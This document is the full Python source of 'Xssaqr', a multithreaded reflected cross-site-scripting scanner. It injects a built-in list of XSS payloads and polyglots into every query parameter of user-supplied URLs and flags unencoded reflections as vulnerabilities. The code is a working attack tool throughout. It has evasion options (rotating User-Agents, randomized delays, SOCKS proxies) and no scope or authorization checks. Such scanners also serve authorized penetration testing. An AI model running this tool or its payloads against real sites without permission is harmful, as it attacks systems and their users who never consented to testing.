
#!/usr/bin/env python3
# Xssaqr by Far7an

import re
import requests
import urllib.parse
import threading
import time
import random
import argparse
import sys
import warnings
import gc
import os
from queue import Queue, Empty as QueueEmpty
from http.cookies import SimpleCookie
from colorama import Fore, Style, init
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from datetime import datetime
import pytz

warnings.filterwarnings("ignore")
init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
]

xss_payloads = [
    '"><script>alert(0x000123)</script>',
    '\'\\"--></style></script><script>alert(0x000123)</script>',
    '"<>"<script>confirm(2)</script>',
    '"\\"/><script>confirm(1);</script><img src=x onerror=x.onerror=prompt(0)>"',
    '"><iframe/onload=alert(1)>',
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(\'XSSAQR\') )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(\'XSSAQR\')//>\\x3e',
    '\';alert(String.fromCharCode(88,83,83,65,81,82))//\';alert(String.fromCharCode(88,83,83,65,81,82))//";alert(String.fromCharCode(88,83,83,65,81,82))//";alert(String.fromCharCode(88,83,83,65,81,82))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83,65,81,82))</SCRIPT>',
    '\'">><marquee><img src=x onerror=alert(\'XSSAQR\')></marquee>"></plaintext\\></|\\><plaintext/onmouseover=alert(\'XSSAQR\')><script>alert(\'XSSAQR\')</script>@gmail.com<isindex formaction=javascript:alert(/XSSAQR/) type=submit>\'-->"></script><script>alert(\'XSSAQR\')</script>"><img/id="alert&lpar;\'XSSAQR\')"/alt="/"src="/"onerror=eval(id&%23x29;>\'"><img src="http://i.imgur.com/P8mL8.jpg">',
    '-->\'"/></sCript><svG x=">" onload=(co\\u006efirm)(\'XSSAQR\')>',
]

BANNER = r"""
.-
                                        . -##=#%%%#%%%*-::.
                                    .*%#%%%%%%%%%%%%%%%%%%%%%#*=-.
                                 -%%%%%%%%%%%*=-%%%%%%%%%%%%%*-
                              -%%%%%%%%%%%%%%%%%********%%%%%%%%%%*:
                            :%%%%%%%%%%%%%%%%%%%%%%%%%%%%+===----=*#%%#.
                            .#%%%%%%%*:   -%%%%%%%%#.   :%%%%%%%%%+
                         .*: *%%%*+*:   -#%%%%%%#+-.%#=##    =%%%%%%%:
                       +%%%%#==%%%%%%%%%%%%%* ....:.%*:## %%%#.=%%%%%%%+
                      %%%%%%%%%%%%%%%%%*****#*+++ ++  . .%%%%%%%%%#%%%%=%#
                     =%%%%%%%%%%%%%%%%%%%%%%%%%%% *%%% *%%%%%=-%%%%%- :+#  :
                     =%%%%*:=%%%%%%%%%%%%%%%%%%+#%= #%%= *:%%%%=-%%%%%.
                      %%-            ..%%%%%%%%%%.%* %%#%-.#.%%%%%%%%%%#
                      .#                %%%%%%%%%.%# %%:#+.%%*-%%%%+%%%%%:
                                        +%%%%%%%%.%# %%:#+.%%%%%%%%#-+ *%%*
                                      -%%%%%%%%%%.%* %%:#+.%%%+#%%%%#+*   #%.
                                      =%%%%%%%%.-#:.%%#:%:.%%:  %%%%%%%+    -*
                                    +%%%%%%%#.:#..%%#:#:.#%%%% *%%%%%%%%-
                                    =%%%%%%.-% .%%#.%. * =%%%.  *%%%%.*%%-
                                  -%%%%%%. +..%%#-#. #%%%=   +%#  #%--  +%-
                                 #%%%%#.:#.:%%%%%..#%%%- *%%%*-=%%..=     +:
                                %%%%%%%% .%%%%%%% #:++ *%%%%%%+*%%%# :%.
                               =:%%%%#.:%%+**.#%:.%%%=.%%- :: =+ #%=%+ -%.
                                +%%#.:%%%:  =%:.#%%#.:%* #%%%= :% .  #%- -
                                %%%= %%# #%%..%%%%..%%%*.%%= *=:%     -*%:
                               .%%+ .*.#%:# :%%%.:%%%%..%=  #=  :
                               .%.-- *%%# # :%% +%%#..%= :# #=
                                - =- %%%# # :-: +%:.%%* #*  #-
                                     %%%# # :%% +%:=%%* #=
                                  -: %%%# .   % +%:=%   #=
                                     =%%#   .* *%: %%: #=
                                      =%#   %:-%+ =*
                                       -#   : =#
                                              :=

    ─────────────────────────────────────────────────
             XSSAQR    |  by Far7an
       Instagram : uevilz
       GitHub    : uevilz
    ─────────────────────────────────────────────────
"""


def print_banner():
    print(f"{Fore.WHITE}{BANNER}{Style.RESET_ALL}")


class TableHelpFormatter(argparse.RawDescriptionHelpFormatter):
    def _format_action(self, action):
        if not action.option_strings:
            return super()._format_action(action)
        opts = ", ".join(action.option_strings)
        help_text = action.help or ""
        return f"  {opts:<22} {help_text}\n"


def print_help_table():
    print(f"{Fore.WHITE}{BANNER}{Style.RESET_ALL}")
    bar = "=" * 70

    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  USAGE{Style.RESET_ALL}")
    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print(f"  xssaqr.py -u <URL>   [options]")
    print(f"  xssaqr.py -i <FILE>  [options]")
    print()

    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  TARGET{Style.RESET_ALL}")
    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print(f"  {'-u, --url URL':<22} Single URL to scan")
    print(f"  {'-i, --input FILE':<22} File containing URLs (one per line)")
    print()

    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  REQUEST{Style.RESET_ALL}")
    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print(f"  {'-t, --threads INT':<22} Number of threads (default: 20)")
    print(f"  {'-d, --delay MS':<22} Delay between requests in ms (default: 100)")
    print(f"  {'--timeout SEC':<22} Request timeout (default: 20)")
    print(f"  {'-H, --header HEADER':<22} Custom header (repeatable)")
    print(f"  {'-p, --proxy URL':<22} Proxy (http/socks4/socks5/socks5h)")
    print(f"  {'--random-agent':<22} Use random User-Agent per request")
    print(f"  {'--user-agent UA':<22} Specific User-Agent")
    print()

    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  PAYLOADS{Style.RESET_ALL}")
    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print(f"  {'--payloads FILE':<22} Custom payloads file")
    print()

    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  OUTPUT{Style.RESET_ALL}")
    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print(f"  {'-o, --output FILE':<22} Save results to file")
    print(f"  {'--progress':<22} Show progress bar")
    print(f"  {'-q, --quiet':<22} Quiet mode")
    print(f"  {'--debug':<22} Enable debug output")
    print()

    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  OTHER{Style.RESET_ALL}")
    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print(f"  {'-h, --help':<22} Show this help message")
    print()

    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  EXAMPLES{Style.RESET_ALL}")
    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print(f'  python3 xssaqr.py -u "https://target.com/?q=test"')
    print(f'  python3 xssaqr.py -i urls.txt -t 30')
    print(f'  python3 xssaqr.py -i urls.txt --payloads my_payloads.txt')
    print(f'  python3 xssaqr.py -i urls.txt -p socks5://127.0.0.1:1080')
    print(f'  python3 xssaqr.py -i urls.txt -H "Cookie: PHPSESSID=abc"')
    print(f'  python3 xssaqr.py -i urls.txt -o results.txt')
    print(f"{Fore.WHITE}{bar}{Style.RESET_ALL}")
    print()


progress_lock = threading.Lock()
vulnerability_lock = threading.Lock()
print_lock = threading.Lock()
progress = 0
total_urls = 0
reported_vulnerabilities = set()
reported_urls = set()
quiet_mode = False
debug_mode = False
show_progress = False


class PayloadGenerator:
    def __init__(self, payloads=None, file_path=None):
        self.payloads = []
        if file_path and os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        self.payloads.append(line)
        elif payloads:
            self.payloads = list(payloads)

    def get_payloads(self):
        return self.payloads


class OutputFileManager:
    def __init__(self, filename=None):
        self.filename = filename
        self.file = None

    def __enter__(self):
        if self.filename:
            try:
                self.file = open(self.filename, 'w', encoding='utf-8')
            except IOError as e:
                print(f"Error opening output file: {e}")
                self.file = None
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.file:
            self.file.close()

    def write(self, message):
        if self.file:
            clean = re.sub(r'\033\[[0-9;]*m', '', message)
            clean = re.sub(r'\033\]8;;.*?\033\\', '', clean)
            clean = re.sub(r'\033\]8;;\033\\', '', clean)
            self.file.write(clean)
            self.file.flush()


def make_clickable(url, text):
    return f"\033]8;;{url}\033\\{text}\033]8;;\033\\"


def build_proxies(proxy):
    if not proxy:
        return None
    return {'http': proxy, 'https': proxy}


def parse_cookies_from_headers(headers):
    cookies = {}
    if 'Cookie' in headers:
        c = SimpleCookie()
        try:
            c.load(headers['Cookie'])
            cookies = {k: v.value for k, v in c.items()}
        except Exception:
            pass
        del headers['Cookie']
    return cookies


def debug_print(msg):
    if debug_mode:
        with print_lock:
            sys.stdout.write(f"{Fore.MAGENTA}[DEBUG]{Style.RESET_ALL} {msg}\n")
            sys.stdout.flush()


def progress_bar(current, total, width=40):
    if not show_progress or total <= 0:
        return
    ratio = min(1.0, current / total)
    filled = int(width * ratio)
    bar = "#" * filled + "-" * (width - filled)
    percent = ratio * 100
    sys.stdout.write(f"\r  [{bar}] {percent:5.1f}% ({current}/{total})")
    sys.stdout.flush()


HTML_ENTITIES_MAP = {
    '<': ['&lt;', '&#60;', '&#x3c;', '%3C', '%3c'],
    '>': ['&gt;', '&#62;', '&#x3e;', '%3E', '%3e'],
    '"': ['&quot;', '&#34;', '&#x22;', '%22'],
    "'": ['&#39;', '&#x27;', '&apos;', '%27'],
    '(': ['&#40;', '&#x28;', '%28'],
    ')': ['&#41;', '&#x29;', '%29'],
}


def find_payload_window(content, marker):
    pos = content.find(marker)
    if pos != -1:
        return pos, marker

    import html
    decoded = html.unescape(content)
    pos_dec = decoded.find(marker)
    if pos_dec != -1:
        return pos_dec, decoded

    return -1, None


def is_in_safe_context(content, pos, marker):
    before = content[max(0, pos - 2000):pos].lower()

    if before.rfind('<script') > before.rfind('</script'):
        if '</script' not in marker.lower() and '<script' not in marker.lower():
            return True

    if before.rfind('<style') > before.rfind('</style'):
        return True

    if before.rfind('<textarea') > before.rfind('</textarea'):
        return True

    if before.rfind('<title') > before.rfind('</title'):
        return True

    if before.rfind('<noscript') > before.rfind('</noscript'):
        return True

    if before.rfind('<template') > before.rfind('</template'):
        return True

    if before.rfind('<!--') > before.rfind('-->'):
        return True

    return False


def is_marker_encoded(content, pos, marker):
    if pos == -1 or not marker:
        return True

    window = content[max(0, pos - 30):pos + len(marker) + 30]

    sensitive_chars_in_marker = [c for c in ['<', '>', '"', "'"] if c in marker]
    if not sensitive_chars_in_marker:
        return False

    for char in sensitive_chars_in_marker:
        if char in window:
            continue
        for ent in HTML_ENTITIES_MAP.get(char, []):
            if ent in window or ent.lower() in window.lower():
                return True

    return False


def analyze_context(content, marker):
    pos = content.find(marker)
    if pos == -1:
        return None

    before = content[max(0, pos - 1000):pos].lower()

    last_eq = before.rfind('=')
    last_gt = before.rfind('>')
    last_lt = before.rfind('<')

    if last_eq > last_gt and last_eq > last_lt:
        after_eq = before[last_eq + 1:]
        dq = after_eq.count('"')
        sq = after_eq.count("'")
        if dq % 2 == 1:
            return 'attribute_double'
        if sq % 2 == 1:
            return 'attribute_single'
        if dq == 0 and sq == 0:
            return 'attribute_unquoted'

    return 'text'


def find_reflection(content, marker):
    if not content or not marker:
        return None

    if '__next_f' in content or 'self.__next_f' in content:
        return None

    stripped = content.strip()
    if (stripped.startswith('{') or stripped.startswith('[')) and \
       '<html' not in content.lower() and '<body' not in content.lower():
        return None

    pos, haystack = find_payload_window(content, marker)
    if pos == -1:
        return None

    if is_in_safe_context(haystack, pos, marker):
        return None

    if is_marker_encoded(haystack, pos, marker):
        return None

    context = analyze_context(haystack, marker)
    if context is None:
        return None

    if context == 'text' or context.startswith('attribute'):
        return context

    return None


def follow_redirects(url, headers, cookies, max_redirects=5,
                     proxies=None, timeout=30):
    try:
        response = requests.get(
            url, allow_redirects=False, timeout=timeout,
            headers=headers, cookies=cookies,
            proxies=proxies, verify=False
        )
        hops = 0
        while response.is_redirect and hops < max_redirects:
            location = response.headers.get('Location')
            if not location:
                break
            redirect_url = urljoin(url, location)
            response.close()
            response = requests.get(
                redirect_url, allow_redirects=False, timeout=timeout,
                headers=headers, cookies=cookies,
                proxies=proxies, verify=False
            )
            url = redirect_url
            hops += 1
        final_url = response.url
        response.close()
        return final_url
    except requests.RequestException as e:
        debug_print(f"Redirect error: {e}")
        return None


def write_output(url, payload, status, context, output_manager=None):
    global reported_vulnerabilities
    key = f"{url}|||{payload}"
    with vulnerability_lock:
        if key in reported_vulnerabilities:
            return
        reported_vulnerabilities.add(key)
        reported_urls.add(url.split('?')[0])

    encoded_url = urllib.parse.quote(url, safe=':/?&=%')
    clickable_url = make_clickable(encoded_url, encoded_url)
    output = (
        f"\n{Fore.RED}>>> XSS FOUND{Style.RESET_ALL}\n"
        f"  {Fore.WHITE}--> URL:{Style.RESET_ALL}     {clickable_url}\n"
        f"  {Fore.WHITE}--> STATUS:{Style.RESET_ALL}  {status}\n"
        f"  {Fore.WHITE}--> CONTEXT:{Style.RESET_ALL} {context}\n"
    )
    with print_lock:
        sys.stdout.write(output)
        sys.stdout.flush()
    if output_manager:
        output_manager.write(
            f"URL: {encoded_url} | Status: {status} | Context: {context} | Payload: {payload}\n"
        )


def write_no_xss(url, output_manager=None):
    output = f"{Fore.RED}[x]{Style.RESET_ALL} {url} {Fore.WHITE}-- No XSS{Style.RESET_ALL}\n"
    with print_lock:
        sys.stdout.write(output)
        sys.stdout.flush()
    if output_manager:
        output_manager.write(f"[x] {url} -- No XSS\n")


def scan_url(url, payload_generator, timeout, delay, proxy, custom_headers,
             output_manager, use_random_agent, custom_user_agent):
    global user_agents
    global progress

    headers = custom_headers.copy()
    cookies = parse_cookies_from_headers(headers)

    if custom_user_agent:
        headers['User-Agent'] = custom_user_agent
    elif use_random_agent or 'User-Agent' not in headers:
        headers['User-Agent'] = random.choice(user_agents)

    proxies = build_proxies(proxy)

    final_url = follow_redirects(url, headers, cookies, max_redirects=5,
                                 proxies=proxies, timeout=timeout)
    if not final_url:
        debug_print(f"Failed to reach: {url}")
        write_no_xss(url, output_manager)
        with progress_lock:
            progress += 1
            progress_bar(progress, total_urls)
        return

    parsed = urlparse(final_url)
    base_params = parse_qs(parsed.query, keep_blank_values=True)
    if not base_params:
        debug_print(f"No query params: {url}")
        write_no_xss(url, output_manager)
        with progress_lock:
            progress += 1
            progress_bar(progress, total_urls)
        return

    found = False

    for payload in payload_generator.get_payloads():
        for target_param in base_params:
            test_params = {}
            for p, values in base_params.items():
                if p == target_param:
                    test_params[p] = [v + payload for v in values]
                else:
                    test_params[p] = values

            new_query = urlencode(test_params, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))

            req_headers = headers.copy()
            if use_random_agent and not custom_user_agent:
                req_headers['User-Agent'] = random.choice(user_agents)

            response = None
            try:
                response = requests.get(
                    new_url, timeout=timeout, verify=False,
                    headers=req_headers, cookies=cookies, proxies=proxies
                )
                status_code = response.status_code
                ctype = response.headers.get('Content-Type', '').lower()

                if any(t in ctype for t in [
                    'text/html', 'application/xhtml+xml',
                    'text/xml', 'application/xml',
                    'text/plain', 'application/json'
                ]):
                    text = response.text
                    reflection = find_reflection(text, payload)
                    if reflection:
                        write_output(new_url, payload, status_code, reflection,
                                     output_manager)
                        found = True

            except requests.RequestException as e:
                debug_print(f"Request error on {new_url}: {e}")
            finally:
                if response:
                    response.close()
                    del response

            if delay > 0:
                sleep_time = delay / 1000.0
                sleep_time += random.uniform(-delay * 0.2, delay * 0.2) / 1000.0
                time.sleep(max(0.001, sleep_time))

    if not found:
        write_no_xss(url, output_manager)

    with progress_lock:
        progress += 1
        progress_bar(progress, total_urls)


def worker(queue, payload_generator, timeout, delay, proxy, custom_headers,
           output_manager, use_random_agent, custom_user_agent, stop_event):
    while not stop_event.is_set():
        url = None
        try:
            url = queue.get(timeout=1.0)
        except QueueEmpty:
            break
        except Exception:
            break

        try:
            scan_url(url, payload_generator, timeout, delay, proxy,
                     custom_headers, output_manager,
                     use_random_agent, custom_user_agent)
        except Exception as e:
            debug_print(f"Worker error on {url}: {e}")
        finally:
            if url is not None:
                try:
                    queue.task_done()
                except ValueError:
                    pass


def start_attack(queue, payload_gen, args, custom_headers,
                 custom_user_agent, output_manager):
    stop_event = threading.Event()
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(
            target=worker,
            args=(queue, payload_gen, args.timeout, args.delay, args.proxy,
                  custom_headers, output_manager, args.random_agent,
                  custom_user_agent, stop_event),
            daemon=True
        )
        t.start()
        threads.append(t)

    try:
        while any(t.is_alive() for t in threads):
            try:
                queue.join()
                break
            except KeyboardInterrupt:
                raise
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Scan interrupted by user.{Style.RESET_ALL}")
        stop_event.set()
        while not queue.empty():
            try:
                queue.get_nowait()
                try:
                    queue.task_done()
                except ValueError:
                    pass
            except QueueEmpty:
                break

    stop_event.set()
    for t in threads:
        t.join(timeout=3)
    gc.collect()


def load_all_urls(file_path):
    urls = []
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            u = line.strip()
            if u and not u.startswith('#'):
                urls.append(u)
    return urls


def count_urls(file_path):
    count = 0
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                count += 1
    return count


def main():
    global total_urls, quiet_mode, debug_mode, progress, show_progress

    description = '''
    Xssaqr by Far7an
    '''

    if len(sys.argv) > 1 and sys.argv[1] in ('-h', '--help'):
        print_help_table()
        sys.exit(0)

    parser = argparse.ArgumentParser(
        description=description,
        formatter_class=TableHelpFormatter,
        add_help=False
    )
    parser.add_argument('-h', '--help', action='store_true',
                        help='Show this help message')
    parser.add_argument('-u', '--url', dest='url',
                        type=str, metavar='URL',
                        help='Single URL to scan')
    parser.add_argument('-i', '--input', dest='input',
                        type=str, metavar='FILE',
                        help='File containing URLs (one per line)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode')
    parser.add_argument('-t', '--threads', type=int, default=20, metavar='int',
                        help='Number of threads (default: 20)')
    parser.add_argument('-d', '--delay', type=int, default=100, metavar='MS',
                        help='Delay between requests in ms (default: 100)')
    parser.add_argument('-H', '--header', action='append', metavar='HEADER',
                        help='Custom header (e.g. -H "Cookie: a=b")')
    parser.add_argument('--payloads', type=str, metavar='FILE',
                        help='Custom payloads file')
    parser.add_argument('--timeout', type=int, default=20, metavar='SEC',
                        help='Request timeout (default: 20)')
    parser.add_argument('--debug', action='store_true',
                        help='Enable debug output')
    parser.add_argument('-p', '--proxy', dest='proxy',
                        type=str, metavar='URL',
                        help='Proxy (http/socks4/socks5/socks5h)')
    parser.add_argument('--random-agent', action='store_true',
                        help='Use random User-Agent per request')
    parser.add_argument('--user-agent', type=str, metavar='UA',
                        help='Specific User-Agent')
    parser.add_argument('--progress', action='store_true',
                        help='Show progress bar')
    parser.add_argument('-o', '--output', type=str, metavar='FILE',
                        help='Save results to file (output)')

    args = parser.parse_args()

    if args.help:
        print_help_table()
        sys.exit(0)

    if not args.url and not args.input:
        print_banner()
        print(f"{Fore.RED}[x]{Style.RESET_ALL} Error: you must provide -u <URL> or -i <FILE>")
        print()
        print(f"{Fore.WHITE}Examples:{Style.RESET_ALL}")
        print('  python3 xssaqr.py -u "https://target.com/?q=test"')
        print('  python3 xssaqr.py -i urls.txt')
        print()
        return

    if args.url and args.input:
        print_banner()
        print(f"{Fore.RED}[x]{Style.RESET_ALL} Error: use either -u or -i, not both")
        return

    quiet_mode = args.quiet
    debug_mode = args.debug
    show_progress = args.progress

    if quiet_mode:
        debug_mode = False
        show_progress = False

    if args.url:
        target = args.url
        if not target.startswith(('http://', 'https://')):
            if '.' in target and ' ' not in target:
                target = 'https://' + target
            else:
                print(f"{Fore.RED}[x] Error: '{target}' is not a valid URL{Style.RESET_ALL}")
                return
        input_is_url = True
    else:
        target = args.input
        if not os.path.isfile(target):
            print(f"{Fore.RED}[x] Error: file '{target}' not found{Style.RESET_ALL}")
            return
        input_is_url = False

    if input_is_url:
        total_urls = 1
    else:
        total_urls = count_urls(target)

    progress = 0

    if not quiet_mode:
        print_banner()
        print(f"{Fore.WHITE}[+]{Style.RESET_ALL} Xssaqr by Far7an")
        print(f"    {Fore.WHITE}->{Style.RESET_ALL} Target:   {target}")
        print(f"    {Fore.WHITE}->{Style.RESET_ALL} URLs:     {total_urls}")
        print(f"    {Fore.WHITE}->{Style.RESET_ALL} Threads:  {args.threads}")
        print()

    if args.payloads and os.path.exists(args.payloads):
        payload_gen = PayloadGenerator(file_path=args.payloads)
    else:
        payload_gen = PayloadGenerator(payloads=xss_payloads)

    if not quiet_mode:
        print(f"    {Fore.WHITE}->{Style.RESET_ALL} Payloads: {len(payload_gen.get_payloads())}")
        print()

    custom_headers = {}
    custom_user_agent = args.user_agent
    if args.header:
        for header in args.header:
            parts = header.split(':', 1)
            if len(parts) == 2:
                key, value = parts
                custom_headers[key.strip()] = value.strip()
                if key.strip().lower() == 'user-agent':
                    custom_user_agent = value.strip()

    output_manager = OutputFileManager(args.output)
    with output_manager:
        queue = Queue()
        if input_is_url:
            queue.put(target)
        else:
            all_urls = load_all_urls(target)
            for u in all_urls:
                queue.put(u)

        start_attack(queue, payload_gen, args, custom_headers,
                     custom_user_agent, output_manager)

    try:
        saudi_tz = pytz.timezone("Asia/Riyadh")
        timestamp = datetime.now(saudi_tz).strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    total_found = len(reported_urls)
    safe_count = max(0, total_urls - total_found)

    print()
    print(f"\n{Fore.WHITE}[+]{Style.RESET_ALL} Scan Complete")
    print()
    print(f"  {Fore.WHITE}Time:{Style.RESET_ALL}   {timestamp}")
    print(f"  {Fore.WHITE}URLs:{Style.RESET_ALL}   {total_urls}")
    print(f"  {Fore.RED}Vuln:{Style.RESET_ALL}   {total_found}")
    print(f"  {Fore.WHITE}Safe:{Style.RESET_ALL}   {safe_count}")
    print()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Scan interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}ERROR: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
